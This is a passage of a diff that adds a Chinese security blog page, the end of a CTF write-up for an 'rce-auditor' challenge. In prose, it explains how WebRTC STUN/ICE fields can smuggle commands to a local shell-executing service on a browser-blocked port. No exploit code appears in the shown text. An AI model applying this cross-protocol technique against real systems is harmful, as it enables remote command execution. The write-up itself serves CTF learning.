class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a>Writeup</h6><h6 id="这个内部服务器监听在localhost-6666将从输入中读取内容并在shell中逐行执行。但是，Chromium-和Firefox-将会阻止到端口6666的任何访问由于ERR-UNSAFE-PORT。它旨在保护用户免受协议走私攻击。"><a href="#这个内部服务器监听在localhost-6666将从输入中读取内容并在shell中逐行执行。但是，Chromium-和Firefox-将会阻止到端口6666的任何访问由于ERR-UNSAFE-PORT。它旨在保护用户免受协议走私攻击。" class="headerlink" title="这个内部服务器监听在localhost:6666将从输入中读取内容并在shell中逐行执行。但是，Chromium(和Firefox)将会阻止到端口6666的任何访问由于ERR_UNSAFE_PORT。它旨在保护用户免受协议走私攻击。"></a>这个内部服务器监听在<code>localhost:6666</code>将从输入中读取内容并在<code>shell</code>中逐行执行。但是，<code>Chromium</code>(和<code>Firefox</code>)将会<a href="https://superuser.com/a/188070" target="_blank" rel="noopener">阻止到端口6666的任何访问</a>由于<code>ERR_UNSAFE_PORT</code>。它旨在保护用户免受协议走私攻击。</h6><h6 id="因此，基于HTTP的请求-XHR-fetch-html-将无法发送。我们必须利用其他的协议。尽管Chromium支持ftp协议，但是利用ftp协议走私是很困难的。"><a href="#因此，基于HTTP的请求-XHR-fetch-html-将无法发送。我们必须利用其他的协议。尽管Chromium支持ftp协议，但是利用ftp协议走私是很困难的。" class="headerlink" title="因此，基于HTTP的请求(XHR/fetch/html)将无法发送。我们必须利用其他的协议。尽管Chromium支持ftp协议，但是利用ftp协议走私是很困难的。"></a>因此，基于HTTP的请求(XHR/fetch/html)将无法发送。我们必须利用其他的协议。尽管<code>Chromium</code>支持<code>ftp</code>协议，但是利用<code>ftp</code>协议走私是很困难的。</h6><h6 id="如今，现代的浏览器支持WebRTC-API，这个API旨在建立对等连接。在协商过程中，将使用STUN协议来选择ICE-candidates。"><a href="#如今，现代的浏览器支持WebRTC-API，这个API旨在建立对等连接。在协商过程中，将使用STUN协议来选择ICE-candidates。" class="headerlink" title="如今，现代的浏览器支持WebRTC API，这个API旨在建立对等连接。在协商过程中，将使用STUN协议来选择ICE candidates。"></a>如今，现代的浏览器支持<a href="https://developer.mozilla.org/en-US/docs/Web/API/WebRTC_API" target="_blank" rel="noopener">WebRTC API</a>，这个API旨在建立对等连接。在协商过程中，将使用<a href="https://en.wikipedia.org/wiki/STUN" target="_blank" rel="noopener">STUN</a>协议来选择<a href="https://en.wikipedia.org/wiki/Interactive_Connectivity_Establishment" target="_blank" rel="noopener">ICE candidates</a>。</h6><h6 id="但是它不是简单的。"><a href="#但是它不是简单的。" class="headerlink" title="但是它不是简单的。"></a>但是它不是简单的。</h6><h6 id="在初始化WebRTC-TURN服务器时指定用户名和密码将不起作用，因为TURN握手已经考虑到此协议走私攻击。"><a href="#在初始化WebRTC-TURN服务器时指定用户名和密码将不起作用，因为TURN握手已经考虑到此协议走私攻击。" class="headerlink" title="在初始化WebRTC TURN服务器时指定用户名和密码将不起作用，因为TURN握手已经考虑到此协议走私攻击。"></a>在初始化<code>WebRTC TURN</code>服务器时指定用户名和密码将不起作用，因为TURN握手已经考虑到此协议走私攻击。</h6><ol>
+<li>尽管用户名和密码是可控的，但这不是浏览器发送的第一个数据包。</li>
+<li>除非浏览器收到有效的响应，否则它将不会发送包含用户名和密码的身份验证数据包。</li>
+<li>我们无法控制第一个握手包中的任何字节。</li>
+</ol>
+<h6 id="STUN-服务器也不起作用。原因与以下相同。"><a href="#STUN-服务器也不起作用。原因与以下相同。" class="headerlink" title="STUN 服务器也不起作用。原因与以下相同。"></a>STUN 服务器也不起作用。原因与以下相同。</h6><h6 id="因此，我们必须首先建立有效的STUN协议，然后以某种方式将数据包发送到我们的目标。该漏洞利用RFC-5245种的ICE-candidate和ice-ufrag-或ice-pwd-来控制部分数据包。并用于对ICE-candidate服务器的身份验证。"><a href="#因此，我们必须首先建立有效的STUN协议，然后以某种方式将数据包发送到我们的目标。该漏洞利用RFC-5245种的ICE-candidate和ice-ufrag-或ice-pwd-来控制部分数据包。并用于对ICE-candidate服务器的身份验证。" class="headerlink" title="因此，我们必须首先建立有效的STUN协议，然后以某种方式将数据包发送到我们的目标。该漏洞利用RFC 5245种的ICE candidate和ice-ufrag(或ice-pwd)来控制部分数据包。并用于对ICE candidate服务器的身份验证。"></a>因此，我们必须首先建立有效的STUN协议，然后以某种方式将数据包发送到我们的目标。该漏洞利用<a href="https://tools.ietf.org/html/rfc5245" target="_blank" rel="noopener">RFC 5245</a>种的<code>ICE candidate</code>和<code>ice-ufrag</code>(或<code>ice-pwd</code>)来控制部分数据包。并用于对<code>ICE candidate</code>服务器的身份验证。</h6><h6 id="完整的解决方案，请参阅exploit目录。"><a href="#完整的解决方案，请参阅exploit目录。" class="headerlink" title="完整的解决方案，请参阅exploit目录。"></a>完整的解决方案，请参阅<code>exploit</code>目录。</h6><h5 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h5><h6 id="阻止不安全端口的行为很有趣。有一天，我创建了一个测试Python服务器0-0-0-0-6666，我发现浏览器本身阻止了我的访问。"><a href="#阻止不安全端口的行为很有趣。有一天，我创建了一个测试Python服务器0-0-0-0-6666，我发现浏览器本身阻止了我的访问。" class="headerlink" title="阻止不安全端口的行为很有趣。有一天，我创建了一个测试Python服务器0.0.0.0:6666，我发现浏览器本身阻止了我的访问。"></a>阻止不安全端口的行为很有趣。有一天，我创建了一个测试Python服务器<code>0.0.0.0:6666</code>，我发现浏览器本身阻止了我的访问。</h6><h6 id="对于WebRTC部分，它开始遵循CSP-connect-src策略。-这是RCTF的挑战之一-然后我注意到STUN协议不是HTTP协议。我们可以滥用它吗？这个挑战结合了这两个想法。"><a href="#对于WebRTC部分，它开始遵循CSP-connect-src策略。-这是RCTF的挑战之一-然后我注意到STUN协议不是HTTP协议。我们可以滥用它吗？这个挑战结合了这两个想法。" class="headerlink" title="对于WebRTC部分，它开始遵循CSP connect-src策略。(这是RCTF的挑战之一)然后我注意到STUN协议不是HTTP协议。我们可以滥用它吗？这个挑战结合了这两个想法。"></a>对于<code>WebRTC</code>部分，<a href="https://github.com/w3c/webrtc-nv-use-cases/issues/35" target="_blank" rel="noopener">它开始遵循CSP connect-src策略</a>。(这是<a href="https://github.com/zsxsoft/my-ctf-challenges/tree/master/rctf2019/jail%20%26%20password#jail" target="_blank" rel="noopener">RCTF的挑战之一</a>)然后我注意到STUN协议不是HTTP协议。我们可以滥用它吗？这个挑战结合了这两个想法。</h6><h5 id="参考链接-2"><a href="#参考链接-2" class="headerlink" title="参考链接"></a>参考链接</h5><h6 id="https-www-jianshu-com-p-35670c60430c"><a href="#https-www-jianshu-com-p-35670c60430c" class="headerlink" title="https://www.jianshu.com/p/35670c60430c"></a><a href="https://www.jianshu.com/p/35670c60430c" target="_blank" rel="noopener">https://www.jianshu.com/p/35670c60430c</a></h6><h6 id="https-juejin-im-post-5cdcd7e9e51d456e6d133594"><a href="#https-juejin-im-post-5cdcd7e9e51d456e6d133594" class="headerlink" title="https://juejin.im/post/5cdcd7e9e51d456e6d133594"></a><a href="https://juejin.im/post/5cdcd7e9e51d456e6d133594" target="_blank" rel="noopener">https://juejin.im/post/5cdcd7e9e51d456e6d133594</a></h6><h6 id="ICE-servers"><a href="#ICE-servers" class="headerlink" title="ICE servers"></a><a href="https://webrtc.github.io/samples/src/content/peerconnection/trickle-ice/" target="_blank" rel="noopener">ICE servers</a></h6>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/12/17/http请求走私/" rel="next" title="http请求走私">
+                <i class="fa fa-chevron-left"></i> http请求走私
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/avatar.jpg" alt="Ljdd520">
+            
+              <p class="site-author-name" itemprop="name">Ljdd520</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">6</span>
+                  <span class="site-state-item-name">分类</span>
+                </a>
+              </div>
+            
+
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/yourname" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:yourname@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                友情链接
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://blog.wonderkun.cc/" title="wonderkun" target="_blank">wonderkun</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://example.com/" title="Title" target="_blank">Title</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#0x02-rce-auditor"><span class="nav-number">1.0.1.</span> <span class="nav-text">0x02 rce-auditor</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#环境的文件目录如下："><span class="nav-number">1.0.1.1.</span> <span class="nav-text">环境的文件目录如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面是每个目录和文件的介绍。"><span class="nav-number">1.0.1.2.</span> <span class="nav-text">下面是每个目录和文件的介绍。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#docker目录存放的是环境的基本文件，而exploit存放的是解决该问题的文件，下面将从docker目录开始详细的每一个文件的内容。"><span class="nav-number">1.0.1.3.</span> <span class="nav-text">docker目录存放的是环境的基本文件，而exploit存放的是解决该问题的文件，下面将从docker目录开始详细的每一个文件的内容。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#docker目录下的flag目录。"><span class="nav-number">1.0.1.4.</span> <span class="nav-text">docker目录下的flag目录。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#docker目录下的nginx文件夹。"><span class="nav-number">1.0.1.5.</span> <span class="nav-text">docker目录下的nginx文件夹。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这个配置文件是代理80端口的将http请求代理到unixsocket。"><span class="nav-number">1.0.1.6.</span> <span class="nav-text">这个配置文件是代理80端口的将http请求代理到unixsocket。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#docker目录下的redis文件夹。"><span class="nav-number">1.0.1.7.</span> <span class="nav-text">docker目录下的redis文件夹。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#docker目录的user文件夹。"><span class="nav-number">1.0.1.8.</span> <span class="nav-text">docker目录的user文件夹。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面大体介绍一下这个函数："><span class="nav-number">1.0.1.9.</span> <span class="nav-text">下面大体介绍一下这个函数：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#config-py的内容如下："><span class="nav-number">1.0.1.10.</span> <span class="nav-text">config.py的内容如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#是一个基本配置。"><span class="nav-number">1.0.1.11.</span> <span class="nav-text">是一个基本配置。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#eval-server是eval-server-c编译后的二进制文件。"><span class="nav-number">1.0.1.12.</span> <span class="nav-text">eval_server是eval_server.c编译后的二进制文件。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#eval-server-c的内容如下："><span class="nav-number">1.0.1.13.</span> <span class="nav-text">eval_server.c的内容如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#大家可以自己运行一下看看结果。"><span class="nav-number">1.0.1.14.</span> <span class="nav-text">大家可以自己运行一下看看结果。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#powser-py的内容："><span class="nav-number">1.0.1.15.</span> <span class="nav-text">powser.py的内容：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#详细介绍请戳这里"><span class="nav-number">1.0.1.16.</span> <span class="nav-text">详细介绍请戳这里</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#run-sh的内容如下："><span class="nav-number">1.0.1.17.</span> <span class="nav-text">run.sh的内容如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面是上面文件的详细介绍："><span class="nav-number">1.0.1.18.</span> <span class="nav-text">下面是上面文件的详细介绍：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#参考链接"><span class="nav-number">1.0.1.19.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-outmanzzq-github-io-2018-09-11-chmod-in-linux"><span class="nav-number">1.0.1.20.</span> <span class="nav-text">https://outmanzzq.github.io/2018/09/11/chmod-in-linux/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#web-server-py的内容如下："><span class="nav-number">1.0.1.21.</span> <span class="nav-text">web_server.py的内容如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#详细介绍请戳这里-1"><span class="nav-number">1.0.1.22.</span> <span class="nav-text">详细介绍请戳这里</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#docker-compose-yml的内容如下："><span class="nav-number">1.0.1.23.</span> <span class="nav-text">docker-compose.yml的内容如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#详细介绍请戳这里-2"><span class="nav-number">1.0.1.24.</span> <span class="nav-text">详细介绍请戳这里</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Dockerfile的内容如下："><span class="nav-number">1.0.1.25.</span> <span class="nav-text">Dockerfile的内容如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#下面来详细的介绍一下："><span class="nav-number">1.0.1.26.</span> <span class="nav-text">下面来详细的介绍一下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#参考链接-1"><span class="nav-number">1.0.1.27.</span> <span class="nav-text">参考链接</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-outmanzzq-github-io-2018-09-11-chmod-in-linux-1"><span class="nav-number">1.0.1.28.</span> <span class="nav-text">https://outmanzzq.github.io/2018/09/11/chmod-in-linux/</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#exploit目录的index-html文件的内容如下："><span class="nav-number">1.0.1.29.</span> <span class="nav-text">exploit目录的index.html文件的内容如下：</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#Writeup"><span class="nav-number">1.0.1.30.</span> <span class="nav-text">Writeup</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#这个内部服务器监听在localhost-6666将从输入中读取内容并在shell中逐行执行。但是，Chromium-和Firefox-将会阻止到端口6666的任何访问由于ERR-UNSAFE-PORT。它旨在保护用户免受协议走私攻击。"><span class="nav-number">1.0.1.31.</span> <span class="nav-text">这个内部服务器监听在localhost:6666将从输入中读取内容并在shell中逐行执行。但是，Chromium(和Firefox)将会阻止到端口6666的任何访问由于ERR_UNSAFE_PORT。它旨在保护用户免受协议走私攻击。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因此，基于HTTP的请求-XHR-fetch-html-将无法发送。我们必须利用其他的协议。尽管Chromium支持ftp协议，但是利用ftp协议走私是很困难的。"><span class="nav-number">1.0.1.32.</span> <span class="nav-text">因此，基于HTTP的请求(XHR/fetch/html)将无法发送。我们必须利用其他的协议。尽管Chromium支持ftp协议，但是利用ftp协议走私是很困难的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#如今，现代的浏览器支持WebRTC-API，这个API旨在建立对等连接。在协商过程中，将使用STUN协议来选择ICE-candidates。"><span class="nav-number">1.0.1.33.</span> <span class="nav-text">如今，现代的浏览器支持WebRTC API，这个API旨在建立对等连接。在协商过程中，将使用STUN协议来选择ICE candidates。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#但是它不是简单的。"><span class="nav-number">1.0.1.34.</span> <span class="nav-text">但是它不是简单的。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#在初始化WebRTC-TURN服务器时指定用户名和密码将不起作用，因为TURN握手已经考虑到此协议走私攻击。"><span class="nav-number">1.0.1.35.</span> <span class="nav-text">在初始化WebRTC TURN服务器时指定用户名和密码将不起作用，因为TURN握手已经考虑到此协议走私攻击。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#STUN-服务器也不起作用。原因与以下相同。"><span class="nav-number">1.0.1.36.</span> <span class="nav-text">STUN 服务器也不起作用。原因与以下相同。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#因此，我们必须首先建立有效的STUN协议，然后以某种方式将数据包发送到我们的目标。该漏洞利用RFC-5245种的ICE-candidate和ice-ufrag-或ice-pwd-来控制部分数据包。并用于对ICE-candidate服务器的身份验证。"><span class="nav-number">1.0.1.37.</span> <span class="nav-text">因此，我们必须首先建立有效的STUN协议，然后以某种方式将数据包发送到我们的目标。该漏洞利用RFC 5245种的ICE candidate和ice-ufrag(或ice-pwd)来控制部分数据包。并用于对ICE candidate服务器的身份验证。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#完整的解决方案，请参阅exploit目录。"><span class="nav-number">1.0.1.38.</span> <span class="nav-text">完整的解决方案，请参阅exploit目录。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#后记"><span class="nav-number">1.0.2.</span> <span class="nav-text">后记</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#阻止不安全端口的行为很有趣。有一天，我创建了一个测试Python服务器0-0-0-0-6666，我发现浏览器本身阻止了我的访问。"><span class="nav-number">1.0.2.1.</span> <span class="nav-text">阻止不安全端口的行为很有趣。有一天，我创建了一个测试Python服务器0.0.0.0:6666，我发现浏览器本身阻止了我的访问。</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#对于WebRTC部分，它开始遵循CSP-connect-src策略。-这是RCTF的挑战之一-然后我注意到STUN协议不是HTTP协议。我们可以滥用它吗？这个挑战结合了这两个想法。"><span class="nav-number">1.0.2.2.</span> <span class="nav-text">对于WebRTC部分，它开始遵循CSP connect-src策略。(这是RCTF的挑战之一)然后我注意到STUN协议不是HTTP协议。我们可以滥用它吗？这个挑战结合了这两个想法。</span></a></li></ol></li><li class="nav-item nav-level-5"><a class="nav-link" href="#参考链接-2"><span class="nav-number">1.0.3.</span> <span class="nav-text">参考链接</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#https-www-jianshu-com-p-35670c60430c"><span class="nav-number">1.0.3.1.</span> <span class="nav-text">https://www.jianshu.com/p/35670c60430c</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#https-juejin-im-post-5cdcd7e9e51d456e6d133594"><span class="nav-number">1.0.3.2.</span> <span class="nav-text">https://juejin.im/post/5cdcd7e9e51d456e6d133594</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#ICE-servers"><span class="nav-number">1.0.3.3.</span> <span class="nav-text">ICE servers</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Ljdd520</span>
+
+  
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    
+      <span class="post-meta-item-text">Site words total count&#58;</span>
+    
+    <span title="Site words total count">95.8k</span>
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
